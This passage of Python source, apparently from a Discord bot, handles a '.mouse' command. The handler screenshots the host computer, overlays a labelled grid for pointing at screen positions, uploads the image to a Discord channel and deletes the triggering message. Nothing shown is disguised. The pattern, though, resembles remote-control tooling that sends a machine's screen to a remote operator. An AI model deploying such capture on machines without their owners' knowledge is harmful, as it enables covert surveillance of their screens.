            elif message.content.lower().startswith(".mouse"):
                command = message.content[7:]
                if command.lower() == "":
                    grid_size = 100
                    size = "large"
                elif command.lower() == "large" or command.lower() == "l":
                    grid_size = 100
                    size = "large"
                elif command.lower() == "medium" or command.lower() == "m":
                    grid_size = 75
                    size = "medium"
                elif command.lower() == "small" or command.lower() == "s":
                    grid_size = 50
                    size = "small"
                elif command.lower() == "tiny" or command.lower() == "t":
                    await message.reply("this is a WIP. Please refrain from using this size.")
                    grid_size = 25
                    size = "tiny"
                else:
                    await message.channel.send("Invalid grid size.\nValid values are: large, medium, small, tiny")
                    return

                screenshot = pyautogui.screenshot()
                overlay = Image.new('RGBA', screenshot.size, (0, 0, 0, 0))
                grid_color = (255, 0, 0, 255)  # Grid color and transparency
                
                # Determine the smaller dimension of the grid
                grid_dimension = min(screenshot.width // grid_size, screenshot.height // grid_size)
                labels = string.ascii_uppercase[:grid_dimension]
                
                for x in range(0, screenshot.width, grid_size):
                    for y in range(0, screenshot.height, grid_size):
                        overlay.putpixel((x, y), grid_color)
                        label_x = labels[x // grid_size % grid_dimension]  # Use modulo operator to wrap around labels
                        label_y = y // grid_size + 1
                        label = f"{label_x}{label_y}"
                        draw = ImageDraw.Draw(overlay)
                        
                        # Centering the text
                        label_width, label_height = draw.textsize(label)
                        label_position = ((x + grid_size // 2) - label_width // 2, (y + grid_size // 2) - label_height // 2)
                        
                        # Drawing the text with white fill and black outline
                        font = ImageFont.truetype("arial.ttf", 20)
                        draw.text(label_position, label, fill=(255, 255, 255), font=font, outline=(0, 0, 0))
                
                for x in range(0, screenshot.width, grid_size):
                    for y in range(screenshot.height):
                        overlay.putpixel((x, y), grid_color)
                
                for y in range(0, screenshot.height, grid_size):
                    for x in range(screenshot.width):
                        overlay.putpixel((x, y), grid_color)
                
                global gridresult
                gridresult = Image.alpha_composite(screenshot.convert('RGBA'), overlay)
                path = os.path.join(os.getenv("TEMP"), "finishedscreenshot.png")
                gridresult.save(path)
                file = discord.File(path)
                embed = discord.Embed(title=f"Screenshot with {size} size", color=0xfafafa)
                embed.set_image(url="attachment://finishedscreenshot.png")
                await channel.send(embed=embed, file=file) 
                await message.delete() 
  